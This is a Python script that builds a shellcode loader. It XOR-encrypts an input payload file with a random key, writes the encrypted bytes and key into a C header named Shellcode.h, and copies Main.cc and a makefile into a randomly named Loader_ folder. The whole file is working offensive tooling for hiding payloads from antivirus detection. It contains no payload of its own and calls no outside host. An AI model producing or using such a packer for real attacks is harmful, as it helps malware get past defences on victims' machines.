#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import random


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    key_length = len(key)
    return bytes(data[i] ^ key[i % key_length] for i in range(len(data)))


def to_code(file_path: str) -> str:
    with open(file_path, 'rb') as file:
        bytesread = file.read()
    bytes_array = [f"0x{byte:02X}" for byte in bytesread]
    bytes_string_final = ', '.join(bytes_array)
    ps_shellcode = f"unsigned char Shellcode[] = {{ {bytes_string_final} }};"
    return ps_shellcode


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <file>")
        sys.exit(1)

    FILE = sys.argv[1]
    ENC_FILE = f"{FILE}.enc"

    KEY = ''.join(random.choices('0123456789ABCDEF', k=16))
    key_bytes = bytes.fromhex(KEY)

    with open(FILE, 'rb') as file:
        data = file.read()
        encrypted_data = xor_encrypt(data, key_bytes)

    with open(ENC_FILE, 'wb') as enc_file:
        enc_file.write(encrypted_data)

    enc_shellcode = to_code(ENC_FILE)

    shellcode_h = f"unsigned char key[] = {{ {', '.join([f'0x{byte:02X}' for byte in key_bytes])} }};\n"
    shellcode_h += enc_shellcode
    shellcode_h += f"\nunsigned long SHELLCODE_SIZE = sizeof(Shellcode);\n"

    out_dir = f"Loader_{''.join(random.choices('0123456789ABCDEF', k=16))}"
    os.mkdir(out_dir)
    with open(f"{out_dir}/Shellcode.h", 'w') as file:
        file.write(shellcode_h)

    src = ['Main.cc', 'makefile']
    for s in src:
        os.system(f"powershell cp {s} {out_dir}")
    
    os.remove(ENC_FILE)


if __name__ == "__main__":
    main()
